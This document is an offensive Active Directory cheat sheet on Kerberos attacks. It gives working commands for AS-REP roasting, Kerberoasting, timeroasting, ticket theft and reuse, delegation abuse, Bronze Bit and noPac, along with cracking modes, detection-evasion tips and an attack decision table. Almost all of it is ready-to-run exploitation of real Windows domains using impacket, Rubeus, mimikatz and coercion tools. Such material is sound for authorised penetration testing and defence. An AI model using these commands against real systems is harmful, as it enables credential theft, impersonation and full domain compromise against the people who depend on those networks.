# AD - Kerberos Attacks

## Table of Contents
- [Kerberos Protocol Primer](#kerberos-protocol-primer)
- [Ticket Handling and Environment](#ticket-handling-and-environment)
- [Encryption Types and Hash Modes](#encryption-types-and-hash-modes)
- [User Enumeration via Kerberos](#user-enumeration-via-kerberos)
- [AS-REP Roasting](#as-rep-roasting)
- [Kerberoasting](#kerberoasting)
- [Targeted Kerberoasting (WriteSPN)](#targeted-kerberoasting-writespn)
- [Timeroasting](#timeroasting)
- [Pass-the-Key / OverPass-the-Hash](#pass-the-key--overpass-the-hash)
- [Pass-the-Ticket](#pass-the-ticket)
- [Unconstrained Delegation](#unconstrained-delegation)
- [Constrained Delegation](#constrained-delegation)
- [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
- [S4U2Self Local Privilege Abuse](#s4u2self-local-privilege-abuse)
- [Bronze Bit (CVE-2020-17049)](#bronze-bit-cve-2020-17049)
- [noPac / sAMAccountName Spoofing](#nopac--samaccountname-spoofing)
- [Kerberos Relay](#kerberos-relay)
- [Roast & Delegation Decision Table](#roast--delegation-decision-table)
- [Troubleshooting](#troubleshooting)

For ticket forging that grants domain-wide control (golden, silver, diamond, sapphire) see [domain-dominance.md](domain-dominance.md). For certificate-based authentication, PKINIT, and Shadow Credentials see [adcs.md](adcs.md). For the ACL edges (WriteSPN, GenericWrite, WriteDACL) that enable these delegation writes see [acl-abuse.md](acl-abuse.md). For coercion + relay to LDAP that sets RBCD without owning a credential see [ntlm-relay.md](ntlm-relay.md).

---

## Kerberos Protocol Primer

Just enough to ground the attacks. Three exchanges, all against the KDC (the DC).

- **AS-REQ / AS-REP (authentication):** client proves knowledge of its key by encrypting a timestamp (pre-authentication). KDC returns a **TGT** (encrypted with the `krbtgt` key) plus a session key (encrypted with the client key). AS-REP roasting attacks the case where pre-auth is *disabled*, so the KDC hands out the client-key-encrypted blob to anyone.
- **TGS-REQ / TGS-REP (service ticket):** client presents its TGT and asks for a ticket to a specific **SPN**. KDC returns a **service ticket (TGS)** encrypted with the *target service account's* key. Kerberoasting attacks this: any authenticated user can request a TGS for any SPN, and the encrypted part is crackable offline to the service account password.
- **AP-REQ (service access):** client sends the service ticket to the service. The service decrypts it with its own key — the KDC is not contacted, which is why silver tickets and delegation work.
- **PAC (Privilege Attribute Certificate):** embedded in the TGT/TGS, signed by the KDC. Carries the user's SID, group SIDs, and (via `PAC_CREDENTIAL_INFO` over PKINIT) the NT hash. noPac abuses missing PAC validation; UnPAC-the-hash extracts the NT hash from it.
- **S4U extensions (delegation):** `S4U2Self` lets a service obtain a ticket to *itself* on behalf of any user (no user credential needed). `S4U2Proxy` lets a service forward that ticket to a *second* service. Constrained delegation and RBCD are entirely built on these two.

Key derivation: the **RC4 (etype 23) key is literally the NT hash** — this is why overpass-the-hash works with just a hash. AES keys (17/18) are PBKDF2-derived and **salted with `REALM` + username**, so an AES key is per-account and cannot be derived from the NT hash.

---

## Ticket Handling and Environment

Kerberos is time-sensitive and name-sensitive. Most "Kerberos is broken" moments are clock skew or a target addressed by IP instead of FQDN.

```bash
# Sync clock to the DC before any Kerberos operation (skew tolerance is 5 minutes by default)
sudo ntpdate <dc-ip>
sudo rdate -n <dc-ip>                                  # alternative
sudo timedatectl set-ntp off && sudo net time set -S <dc-ip>
faketime "$(ntpdate -q <dc-ip> | cut -d' ' -f1,2)" impacket-psexec ...   # no host clock change

# Impacket and most Linux tooling read the ccache from KRB5CCNAME
export KRB5CCNAME=/path/to/ticket.ccache
klist                                                  # inspect current ccache
impacket-describeTicket ticket.ccache                  # dump flags, PAC, session key

# Kerberos auth with impacket: -k uses the ccache, -no-pass suppresses the password prompt
impacket-psexec -k -no-pass DOMAIN.LOCAL/user@host.domain.local
impacket-secretsdump -k -no-pass DOMAIN.LOCAL/user@dc01.domain.local

# netexec / evil-winrm with Kerberos
nxc smb dc01.domain.local -u user --use-kcache        # uses KRB5CCNAME
evil-winrm -i dc01.domain.local -r DOMAIN.LOCAL       # -r = realm, reads KRB5CCNAME
```

Always use the FQDN with `-k`. There is no SPN for a bare IP; if you must, add the host to `/etc/hosts` and use the name.

Convert between Windows `.kirbi` and Linux `.ccache`:

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
base64 -d ticket.b64 > ticket.kirbi                    # Rubeus /nowrap output is base64 kirbi
```

Minimal `/etc/krb5.conf`:

```ini
[libdefaults]
    default_realm = DOMAIN.LOCAL
    dns_lookup_kdc = false
    dns_lookup_realm = false
    rdns = false

[realms]
    DOMAIN.LOCAL = {
        kdc = dc01.domain.local
        admin_server = dc01.domain.local
    }

[domain_realm]
    .domain.local = DOMAIN.LOCAL
    domain.local = DOMAIN.LOCAL
```

---

## Encryption Types and Hash Modes

Kerberos etypes you will actually see: **23 = RC4-HMAC** (key = NT hash), **17 = AES128-CTS-HMAC-SHA1-96**, **18 = AES256-CTS-HMAC-SHA1-96**. Legacy: 1 = DES-CBC-CRC, 3 = DES-CBC-MD5 (disabled on modern DFLs). AES keys are salted with realm+username, so an AES key cannot be reused across accounts and cannot be derived from the NT hash. The RC4 key *is* the NT hash — this is why overpass-the-hash works.

`msDS-SupportedEncryptionTypes` on the account object is a bitmask: `0x1` DES-CBC-CRC, `0x2` DES-CBC-MD5, `0x4` RC4-HMAC, `0x8` AES128, `0x10` AES256, `0x80000000` "fast supported" advertisement. A value of `0` means "use defaults" (RC4 for pre-2008 behaviour, AES for modern DFL).

Cracking modes (read the `$krb5..$NN$` prefix to pick the mode):

```bash
# AS-REP roast, etype 23 (RC4)
hashcat -m 18200 asrep.txt rockyou.txt --force
john --format=krb5asrep asrep.txt --wordlist=rockyou.txt

# Kerberoast, etype 23 (RC4) -- by far the most common
hashcat -m 13100 tgs.txt rockyou.txt
john --format=krb5tgs tgs.txt --wordlist=rockyou.txt

# Kerberoast, AES service tickets
hashcat -m 19600 tgs_aes128.txt rockyou.txt     # $krb5tgs$17$  AES128
hashcat -m 19700 tgs_aes256.txt rockyou.txt     # $krb5tgs$18$  AES256

# Sniffed AS-REQ pre-auth timestamps (etype in the prefix)
hashcat -m 7500  asreq.txt rockyou.txt          # etype 23
hashcat -m 19800 asreq.txt rockyou.txt          # etype 17
hashcat -m 19900 asreq.txt rockyou.txt          # etype 18

# Timeroast (MS-SNTP computer-account signatures)
hashcat -m 31300 timeroast.txt rockyou.txt

# Newer hashcat builds add AS-REP AES modes; confirm on your build before assuming a number:
hashcat --help | grep -i -E 'AS-REP|TGS-REP|Pre-Auth|SNTP'
```

Derive keys from a password to feed `-aesKey` / `/aes256`:

```bash
python3 -c "from impacket.krb5.crypto import string_to_key, Enctype; \
print(string_to_key(Enctype.AES256, b'Password123', b'DOMAIN.LOCALsvc_sql').contents.hex())"
```

```cmd
Rubeus.exe hash /password:Password123 /user:svc_sql /domain:domain.local
:: prints RC4 (NT hash), AES128 and AES256 keys with the correct salt
```

---

## User Enumeration via Kerberos

Pre-auth failures distinguish "user does not exist" (`KDC_ERR_C_PRINCIPAL_UNKNOWN`) from "user exists, wrong password" (`KDC_ERR_PREAUTH_FAILED`). Unauthenticated and, unlike LDAP/SMB spraying, username-only probes do not increment `badPwdCount`.

```bash
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
kerbrute passwordspray -d domain.local --dc dc01.domain.local users.txt 'Winter2025!'
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <ip> -no-pass
nxc smb <ip> -u users.txt -p 'Winter2025!' -k --continue-on-success
```

`KDC_ERR_CLIENT_REVOKED` = account disabled/locked. `KDC_ERR_KEY_EXPIRED` = valid password, must change (usable via `impacket-changepasswd`).

---

## AS-REP Roasting

Accounts with `DONT_REQUIRE_PREAUTH` (`userAccountControl` bit `0x400000` = 4194304) return an AS-REP whose enc-part is encrypted with the account's key — crackable offline **with no credentials at all** if you know the username.

Find targets:

```bash
# Unauthenticated: guess/enumerate usernames, ask for AS-REPs
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <ip> -format hashcat -outputfile asrep.txt

# Authenticated: LDAP query returns exactly the roastable set
impacket-GetNPUsers domain.local/user:'Password123' -request -dc-ip <ip> -format hashcat -outputfile asrep.txt
nxc ldap <ip> -u user -p 'Password123' --asreproast asrep.txt
bloodyAD --host dc01.domain.local -d domain.local -u user -p 'Password123' \
  get search --filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' --attr sAMAccountName
ldapsearch -x -H ldap://<ip> -D 'user@domain.local' -w 'Password123' -b 'DC=domain,DC=local' \
  '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName
```

```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap
Rubeus.exe asreproast /user:svc_backup /domain:domain.local /format:hashcat /nowrap
:: PowerView
Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol
```

Crack:

```bash
hashcat -m 18200 asrep.txt rockyou.txt --force
```

**Format gotcha.** Hashcat expects `$krb5asrep$23$user@DOMAIN.LOCAL:<checksum>$<cipher>`. Older Rubeus builds emit `$krb5asrep$user@domain...` without the `23$`. Insert it:

```bash
sed -i 's/\$krb5asrep\$/$krb5asrep$23$/' asrep.txt
```

**Setting the flag yourself.** With `GenericWrite`/`GenericAll` over a user you can enable pre-auth-not-required (targeted AS-REP roast), roast, then restore:

```bash
bloodyAD --host dc01.domain.local -d domain.local -u attacker -p 'Pass' add uac victim -f DONT_REQ_PREAUTH
impacket-GetNPUsers domain.local/attacker:'Pass' -request-user victim -dc-ip <ip> -format hashcat
bloodyAD --host dc01.domain.local -d domain.local -u attacker -p 'Pass' remove uac victim -f DONT_REQ_PREAUTH
```

```powershell
Set-DomainObject -Identity victim -XOR @{useraccountcontrol=4194304}   # toggle on, roast, then run again to restore
```

---

## Kerberoasting

Any authenticated principal can request a service ticket for any SPN. Tickets for *user* accounts with SPNs are encrypted with a password-derived key and crack offline. Machine accounts and `krbtgt` are not worth roasting (128-char random passwords).

```bash
# List SPN users without requesting tickets (recon, quiet)
impacket-GetUserSPNs domain.local/user:'Password123' -dc-ip <ip>

# Request and dump hashes
impacket-GetUserSPNs domain.local/user:'Password123' -dc-ip <ip> -request -outputfile tgs.txt
impacket-GetUserSPNs domain.local/user:'Password123' -dc-ip <ip> -request-user svc_sql

# With a ticket instead of a password
export KRB5CCNAME=user.ccache
impacket-GetUserSPNs -k -no-pass -dc-host dc01.domain.local domain.local/user -request

# Cross-domain / cross-forest
impacket-GetUserSPNs -target-domain child.domain.local domain.local/user:'Pass' -request -dc-ip <ip>

nxc ldap <ip> -u user -p 'Password123' --kerberoasting tgs.txt
```

```cmd
Rubeus.exe kerberoast /outfile:tgs.txt /nowrap
Rubeus.exe kerberoast /user:svc_sql /nowrap
Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.domain.local:1433 /nowrap
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap        :: only privileged SPN users
Rubeus.exe kerberoast /stats                                    :: counts by etype, no tickets requested
Rubeus.exe kerberoast /ticket:<base64 TGT> /nowrap              :: roast from a supplied TGT
```

Crack by etype — read the `$krb5tgs$NN$` prefix:

```bash
hashcat -m 13100 tgs.txt rockyou.txt        # $krb5tgs$23$  RC4
hashcat -m 19600 tgs.txt rockyou.txt        # $krb5tgs$17$  AES128
hashcat -m 19700 tgs.txt rockyou.txt        # $krb5tgs$18$  AES256
```

**Forcing RC4 when the account supports AES.** `msDS-SupportedEncryptionTypes` decides what the KDC will issue, but a client may still request RC4 and many domains honour it. Rubeus `/tgtdeleg` obtains a usable TGT through the GSS-API delegation trick and crafts TGS-REQs advertising RC4 only:

```cmd
Rubeus.exe kerberoast /tgtdeleg /nowrap
Rubeus.exe kerberoast /rc4opsec /nowrap
:: /rc4opsec = /tgtdeleg + skip accounts already configured for AES (avoids AES-only "honeypot" hits
:: and the downgrade-detection event on AES-configured accounts)
```

This fails where RC4 has been disabled domain-wide (`DefaultDomainSupportedEncTypes` / GPO "Network security: Configure encryption types") — then you must crack AES with `-m 19700`, which is orders of magnitude slower.

**Kerberoasting without credentials (the pre-auth nuance).** If any account has `DONT_REQUIRE_PREAUTH`, you can build an AS-REQ for that account requesting a *service ticket* directly (the KDC returns a TGS in the AS-REP), so you can roast SPN accounts with **no valid credentials whatsoever**. Impacket implements this:

```bash
impacket-GetUserSPNs -no-preauth asrep_user -usersfile spn_users.txt \
  -dc-host dc01.domain.local domain.local/ -request
```

**FAST / Kerberos armoring.** When FAST (RFC 6113, "Kerberos Armoring") is enforced via GPO, the AS/TGS exchange is wrapped in an armor key derived from the machine's TGT, so the roastable ciphertext is no longer exposed to an unarmored requester — AS-REP roasting/Kerberoasting from an unjoined host break. If roasting silently returns nothing in a hardened domain, suspect FAST or `Protected Users` (which blocks RC4 and DES entirely).

**Honeypot awareness.** A never-logged-on account with an SPN, `pwdLastSet` far in the past, and `adminCount=1` is often bait. Check `lastLogon`/`logonCount` before roasting broadly.

---

## Targeted Kerberoasting (WriteSPN)

If you hold `GenericWrite`, `GenericAll`, `WriteProperty` on `servicePrincipalName`, or `Validated-SPN` over a user, write an arbitrary SPN, roast, then clean up. Turns a write ACL into a crackable hash. See [acl-abuse.md](acl-abuse.md) for how you got the edge.

```bash
# Add SPN -> roast -> remove
impacket-addspn -u 'domain\attacker' -p 'Pass' -t victim -s 'HOST/attackerspn' dc01.domain.local
impacket-GetUserSPNs domain.local/attacker:'Pass' -dc-ip <ip> -request-user victim -outputfile tgs.txt
impacket-addspn -u 'domain\attacker' -p 'Pass' -t victim -s 'HOST/attackerspn' -r dc01.domain.local  # -r removes

# bloodyAD equivalent
bloodyAD --host dc01.domain.local -d domain.local -u attacker -p 'Pass' \
  set object victim servicePrincipalName -v 'HOST/attackerspn'
bloodyAD --host dc01.domain.local -d domain.local -u attacker -p 'Pass' \
  remove object victim servicePrincipalName -v 'HOST/attackerspn'

# targetedKerberoast.py does add + roast + cleanup in one shot for every writable user
targetedKerberoast.py -v -d domain.local -u attacker -p 'Pass' --dc-host dc01.domain.local
```

```powershell
Set-DomainObject -Identity victim -Set @{serviceprincipalname='HOST/attackerspn'}
Get-DomainSPNTicket -SPN 'HOST/attackerspn' -OutputFormat Hashcat
Set-DomainObject -Identity victim -Clear serviceprincipalname
```

The SPN must be unique in the forest or the write fails with a constraint violation. `HOST/<random>` is safe.

---

## Timeroasting

MS-SNTP lets an *unauthenticated* NTP client ask a DC for a signed time response. The signature is `MD5(NT hash || response)` keyed on the **computer account** RID supplied in the request. Enumerate RIDs, collect signatures, crack offline. No domain credentials, no LDAP, no SMB — only UDP/123 to a DC. Only computer accounts are reachable, so it pays off on machines with weak/manually-set passwords.

```bash
git clone https://github.com/SecuraBV/Timeroast
python3 timeroast.py <dc-ip> -o timeroast.txt          # sweeps RIDs 0-10000 by default
python3 timeroast.py <dc-ip> -a 500 -b 20000 -r 1 -o timeroast.txt   # RID range, rate
python3 timeroast.py <dc-ip> --old-hashes old.txt      # also collect the previous password hash

# Crack
hashcat -m 31300 timeroast.txt rockyou.txt
python3 timecrack.py timeroast.txt wordlist.txt        # bundled cracker

# Map RID -> account name once you have any domain read access
impacket-lookupsid domain.local/user:'Pass'@<dc-ip>
```

Output line format is `<RID>:$sntp-ms$<md5>$<salt>`. A cracked computer password gives you the machine account key → RBCD source, silver tickets for that host, or local SYSTEM via S4U2Self.

---

## Pass-the-Key / OverPass-the-Hash

Turn a key (NT hash or AES key) into a real TGT. "Overpass-the-hash" = use the NT hash as the RC4 Kerberos key; "pass-the-key" is the same operation with an AES key. AES is stealthier — requesting an RC4 TGT in an AES domain lights up event 4768 with `Ticket Encryption Type 0x17`.

```bash
# From NT hash (RC4)
impacket-getTGT domain.local/svc_sql -hashes :2b576acbe6bcfda7294d6bd18041b8fe -dc-ip <ip>
# From AES256 key (pass-the-key, stealthier)
impacket-getTGT domain.local/svc_sql -aesKey <64-hex-aes256-key> -dc-ip <ip>
# From a password
impacket-getTGT domain.local/svc_sql:'Password123' -dc-ip <ip>

export KRB5CCNAME=svc_sql.ccache
impacket-psexec -k -no-pass domain.local/svc_sql@sql01.domain.local
```

```cmd
:: Rubeus asktgt -- /ptt loads the TGT straight into the current logon session
Rubeus.exe asktgt /user:svc_sql /rc4:2b576acbe6bcfda7294d6bd18041b8fe /domain:domain.local /dc:dc01.domain.local /ptt
Rubeus.exe asktgt /user:svc_sql /aes256:<key> /domain:domain.local /nowrap
Rubeus.exe asktgt /user:svc_sql /password:'Password123' /enctype:aes256 /nowrap

:: mimikatz overpass-the-hash (spawns a process with the injected ticket)
mimikatz # sekurlsa::pth /user:svc_sql /domain:domain.local /ntlm:<hash> /run:powershell.exe
```

---

## Pass-the-Ticket

Reuse a TGT or service ticket you obtained (roast/forge/steal). Linux tooling reads the ccache from `KRB5CCNAME`; Windows injects into the LSA session.

```bash
# Linux: point KRB5CCNAME at the ccache and add -k -no-pass
export KRB5CCNAME=/loot/administrator.ccache
impacket-wmiexec -k -no-pass domain.local/administrator@dc01.domain.local
nxc smb dc01.domain.local -u administrator --use-kcache -x whoami

# Convert a captured .kirbi (Rubeus/mimikatz) to ccache first
impacket-ticketConverter administrator.kirbi administrator.ccache
```

```cmd
:: Windows: inject a .kirbi
Rubeus.exe ptt /ticket:administrator.kirbi
Rubeus.exe ptt /ticket:<base64-blob>

:: mimikatz
mimikatz # kerberos::ptt administrator.kirbi
mimikatz # sekurlsa::tickets /export        :: dump all tickets in memory to .kirbi files
klist                                        :: verify the ticket is loaded
```

---

## Unconstrained Delegation

A host trusted for unconstrained delegation caches the **full TGT** of every user who authenticates to it. Compromise that host, coerce a privileged account (ideally a DC computer account) to authenticate to it, and steal its TGT → domain compromise.

Identify: `userAccountControl` has `TRUSTED_FOR_DELEGATION` (`0x80000` = 524288). DCs have it by default; the prizes are *non-DC* servers with it.

```bash
# Find unconstrained-delegation hosts
impacket-findDelegation domain.local/user:'Pass' -dc-ip <ip>
nxc ldap <ip> -u user -p 'Pass' --trusted-for-delegation
bloodyAD --host dc01.domain.local -d domain.local -u user -p 'Pass' \
  get search --filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' --attr sAMAccountName,dNSHostName
```

```powershell
Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol
```

Exploit — you already have SYSTEM/admin on the unconstrained host:

```cmd
:: 1. Monitor for incoming TGTs on the compromised host
Rubeus.exe monitor /interval:5 /nowrap
Rubeus.exe monitor /interval:5 /filteruser:DC01$      :: wait specifically for the DC computer account

:: 3. Once captured, inject and DCSync
Rubeus.exe ptt /ticket:<base64 DC01$ TGT>
```

```bash
# 2. Coerce the DC to authenticate to the compromised host (forces its TGT into your cache)
impacket-printerbug domain.local/user:'Pass'@dc01.domain.local <compromised-host-ip>   # MS-RPRN
python3 PetitPotam.py -u user -p 'Pass' <compromised-host-ip> dc01.domain.local        # MS-EFSRPC
python3 dementor.py <compromised-host-ip> dc01.domain.local -u user -p 'Pass'          # MS-RPRN alt
Coercer coerce -u user -p 'Pass' -l <compromised-host-ip> -t dc01.domain.local         # all coercion methods
```

```cmd
:: SpoolSample.exe (Windows equivalent of printerbug)
SpoolSample.exe dc01.domain.local <compromised-host>
```

On Linux you can be the "unconstrained host" with `impacket-krbrelayx` in `-mode relay`/listen mode: it stands up the delegation listener, receives the coerced DC TGT, and drops a ccache you then use for DCSync. Chain: krbrelayx listening → PetitPotam DC01$ → captured DC TGT → `impacket-secretsdump -k`.

---

## Constrained Delegation

An account with `msDS-AllowedToDelegateTo` populated may request service tickets **to the listed SPNs on behalf of any user** via S4U2Self + S4U2Proxy. Compromise that account → impersonate Administrator to the allowed service.

Two flavours, set by `userAccountControl`:
- **Protocol transition** (`TRUSTED_TO_AUTH_FOR_DELEGATION` = `0x1000000` = 16777216): the account can call S4U2Self for *any* user with no prior ticket. Full impersonation. Easiest to abuse.
- **Kerberos-only / "use Kerberos only"** (flag not set): S4U2Self still succeeds but the resulting ticket is only forwardable if the target user is not sensitive — usable in practice against most users; if it fails, Bronze Bit forces the forwardable flag (see below).

```bash
# Identify
impacket-findDelegation domain.local/user:'Pass' -dc-ip <ip>       # shows AllowedToDelegateTo + flavour
bloodyAD --host dc01.domain.local -d domain.local -u user -p 'Pass' \
  get search --filter '(msDS-AllowedToDelegateTo=*)' --attr sAMAccountName,msDS-AllowedToDelegateTo
```

Exploit — you have the delegating account's password / hash / AES key:

```bash
# getST does S4U2Self + S4U2Proxy in one shot; output ccache impersonates -impersonate to the -spn
impacket-getST -spn 'cifs/target.domain.local' -impersonate Administrator \
  -dc-ip <ip> domain.local/svc_web:'Password123'
impacket-getST -spn 'cifs/target.domain.local' -impersonate Administrator \
  -hashes :<nthash> domain.local/svc_web
export KRB5CCNAME=Administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache
impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local
```

```cmd
Rubeus.exe s4u /user:svc_web /rc4:<nthash> /impersonateuser:Administrator \
  /msdsspn:cifs/target.domain.local /ptt
Rubeus.exe s4u /user:svc_web /aes256:<key> /impersonateuser:Administrator \
  /msdsspn:cifs/target.domain.local /ptt
```

**The alternate-service (SPN-agnostic) trick.** The service class in the S4U2Proxy ticket is **not validated by the KDC** — only the host portion matters. If `msDS-AllowedToDelegateTo` lists `TIME/target` (or any low-value SPN), you can rewrite the service class to `CIFS/`, `HOST/`, `LDAP/`, `HTTP/`, etc. on the *same host* and get full access. `LDAP/dc` → DCSync; `HOST/` or `CIFS/` → psexec; `HTTP/` → WinRM.

```bash
impacket-getST -spn 'time/target.domain.local' -altservice 'cifs/target.domain.local' \
  -impersonate Administrator -hashes :<nthash> domain.local/svc_web
```

```cmd
Rubeus.exe s4u /user:svc_web /rc4:<nthash> /impersonateuser:Administrator \
  /msdsspn:time/target.domain.local /altservice:cifs,host,ldap,http /ptt
```

---

## Resource-Based Constrained Delegation (RBCD)

The single most common lab escalation. Delegation is configured on the **target** via `msDS-AllowedToActOnBehalfOfOtherIdentity` (a security descriptor naming who may impersonate to it). If you can **write that attribute on the target** and you **control an account that has an SPN**, you can impersonate any user to the target.

Requirements (both needed):
1. **Write over the target's `msDS-AllowedToActOnBehalfOfOtherIdentity`** — via `GenericWrite`/`GenericAll`/`WriteDACL`/`WriteProperty` on the target computer, or via NTLM relay to LDAP (see [ntlm-relay.md](ntlm-relay.md)).
2. **A controlled account with an SPN.** A computer account always has SPNs. If `ms-DS-MachineAccountQuota > 0` (default **10**) any authenticated user can create one; otherwise use a machine account whose password you already hold, or reset a controlled account.

End-to-end chain (Linux):

```bash
# 1. Create a computer account (needs MachineAccountQuota > 0)
impacket-addcomputer domain.local/user:'Pass' -computer-name 'EVIL$' \
  -computer-pass 'Evil123!' -dc-ip <ip>

# 2. Write RBCD: allow EVIL$ to act on behalf of others TO the target
impacket-rbcd domain.local/user:'Pass' -delegate-to 'TARGET$' -delegate-from 'EVIL$' \
  -action write -dc-ip <ip>
impacket-rbcd domain.local/user:'Pass' -delegate-to 'TARGET$' -action read -dc-ip <ip>   # verify

# 3. S4U2Self+Proxy as EVIL$, impersonating Administrator, to a service on the target
impacket-getST -spn 'cifs/target.domain.local' -impersonate Administrator \
  -dc-ip <ip> domain.local/'EVIL$':'Evil123!'

# 4. Use the ticket
export KRB5CCNAME='Administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache'
impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local
impacket-secretsdump -k -no-pass domain.local/Administrator@target.domain.local   # if target is a DC -> full dump
```

bloodyAD / netexec alternatives for step 2:

```bash
bloodyAD --host dc01.domain.local -d domain.local -u user -p 'Pass' \
  add rbcd 'TARGET$' 'EVIL$'
nxc ldap <ip> -u user -p 'Pass' --delegate-from 'EVIL$' --delegate-to 'TARGET$'   # (rbcd module)
```

Windows (powermad for the computer, Rubeus for S4U):

```powershell
# 1. Create the computer with powermad
New-MachineAccount -MachineAccount EVIL -Password $(ConvertTo-SecureString 'Evil123!' -AsPlainText -Force)

# 2. Write RBCD with PowerView
$sid = (Get-DomainComputer EVIL).objectsid
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;GA;;;$sid)"
$bytes = New-Object byte[] ($sd.BinaryLength); $sd.GetBinaryForm($bytes,0)
Set-DomainObject TARGET -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}
```

```cmd
:: 3. Rubeus: hash EVIL's password, then s4u
Rubeus.exe hash /password:Evil123! /user:EVIL$ /domain:domain.local
Rubeus.exe s4u /user:EVIL$ /rc4:<EVIL$ rc4 hash> /impersonateuser:Administrator \
  /msdsspn:cifs/target.domain.local /ptt
```

Cleanup: `impacket-rbcd ... -action flush` (or `-delete`), and delete the computer with `impacket-addcomputer ... -delete`.

**Gotcha — impersonating a protected account.** If `Administrator` is in `Protected Users` or flagged "sensitive and cannot be delegated", S4U2Self returns a non-forwardable ticket and S4U2Proxy fails. Impersonate a different Domain Admin, or force the flag with `-force-forwardable` / Bronze Bit.

---

## S4U2Self Local Privilege Abuse

If you hold a **computer account's key** (machine hash/AES from secretsdump, timeroast, or a cracked account), S4U2Self alone lets that machine request a service ticket to *itself* as any user — including a Domain Admin — granting local SYSTEM-level access on that host without any delegation configured. Useful to turn a machine-account key into an interactive admin session on that machine.

```bash
impacket-getST -self -impersonate Administrator -spn 'host/target.domain.local' \
  -hashes :<TARGET$ nthash> domain.local/'TARGET$'
export KRB5CCNAME='Administrator@host_target.domain.local@DOMAIN.LOCAL.ccache'
impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local
```

```cmd
Rubeus.exe s4u /self /user:TARGET$ /rc4:<nthash> /impersonateuser:Administrator \
  /altservice:cifs/target.domain.local /ptt
```

The S4U2Self ticket is issued to the machine itself, so it is valid for services *on that host* (CIFS/HOST/HTTP) — not for lateral movement elsewhere unless combined with RBCD/constrained delegation.

---

## Bronze Bit (CVE-2020-17049)

The S4U2Self ticket's `forwardable` flag is protected only by the service account's own key, not the KDC master key. With the delegating account's key you can **flip the flag on**, defeating "sensitive/cannot be delegated" and `Protected Users`, and letting S4U2Proxy succeed for accounts it should refuse. Patched by enforcing the flag server-side (Nov 2020).

```bash
impacket-getST -spn 'cifs/target.domain.local' -impersonate Administrator \
  -hashes :<nthash> -force-forwardable domain.local/svc_web
```

```cmd
Rubeus.exe s4u /user:svc_web /rc4:<nthash> /impersonateuser:Administrator \
  /msdsspn:cifs/target.domain.local /bronzebit /ptt
```

---

## noPac / sAMAccountName Spoofing

CVE-2021-42278 (sAMAccountName spoofing) + CVE-2021-42287 (KDC PAC confusion). Create a computer, rename its `sAMAccountName` to a DC's name **without the trailing `$`**, request a TGT (issued for the DC-named principal), rename back, then request an S4U/TGS — the KDC, unable to find the renamed principal, resolves to the real DC account and issues a ticket as it. Result: SYSTEM on the DC from any authenticated user, when unpatched. Requires `MachineAccountQuota > 0`.

```bash
# All-in-one implementations
python3 noPac.py domain.local/user:'Pass' -dc-ip <ip> -dc-host dc01.domain.local --impersonate Administrator -use-ldap
python3 sam_the_admin.py 'domain.local/user:Pass' -dc-ip <ip> -shell    # older PoC

nxc smb <ip> -u user -p 'Pass' -M nopac                                 # detection + exploit module
```

Manual chain: `impacket-addcomputer` → `impacket-renameMachine -new-name 'dc01'` → `impacket-getTGT` → rename back → `impacket-getST -impersonate Administrator -u2u`.

---

## Kerberos Relay

Kerberos is normally not relayable, but AP-REQ tickets targeting the *wrong* service class can be redirected locally. `krbrelayx` (Linux) and `KrbRelayUp` (Windows) exploit coerced Kerberos auth (e.g. via `-usessl`/AuthIP/DNS) to relay to LDAP or SMB — a common local-privesc-to-DA primitive. This is mostly host-local and interacts closely with coercion; for the NTLM equivalents and the full relay decision tree see [ntlm-relay.md](ntlm-relay.md).

```bash
# krbrelayx: listen for a coerced Kerberos TGT (unconstrained-delegation relay path)
impacket-krbrelayx -t ldaps://dc01.domain.local --add-computer EVIL 'Evil123!'   # set RBCD via relayed LDAP
```

```cmd
:: KrbRelayUp: local privesc (RBCD via relayed Kerberos LDAP -> SYSTEM)
KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName EVIL$ -ComputerPassword Evil123!
KrbRelayUp.exe spawn -m rbcd -d domain.local -dc dc01.domain.local -cn EVIL$ -cp Evil123!
```

---

## Roast & Delegation Decision Table

| What you control / observe | Attack | Key command | Result |
|---|---|---|---|
| Username only, account has `DONT_REQUIRE_PREAUTH` | AS-REP roast | `GetNPUsers -no-pass` → `-m 18200` | account password |
| Any valid cred; user account has an SPN | Kerberoast | `GetUserSPNs -request` → `-m 13100/19700` | service account password |
| `GenericWrite`/`WriteSPN` over a user | Targeted Kerberoast | `addspn` → `GetUserSPNs -request-user` | that user's password |
| `GenericWrite` over a user, no SPN | Targeted AS-REP roast | set `DONT_REQ_PREAUTH` → roast | that user's password |
| UDP/123 to DC, no creds | Timeroast | `timeroast.py` → `-m 31300` | a computer-account password |
| NT hash or AES key of an account | Overpass-the-hash / PtK | `getTGT -hashes` / `-aesKey` | TGT for that account |
| Admin on a host with `TRUSTED_FOR_DELEGATION` | Unconstrained delegation | `Rubeus monitor` + coerce DC | DC TGT → DCSync |
| Cred of account with `msDS-AllowedToDelegateTo` | Constrained delegation | `getST -spn -impersonate` (+`-altservice`) | admin to that service |
| Write over a computer's `AllowedToActOnBehalfOf...` + a computer account | RBCD | `addcomputer`→`rbcd -action write`→`getST -impersonate` | admin to that computer |
| A computer account's key, want admin on that box | S4U2Self local abuse | `getST -self -impersonate` | SYSTEM on that host |
| Delegation target is `Protected Users` / sensitive | Bronze Bit | add `-force-forwardable` / `/bronzebit` | delegation succeeds anyway |
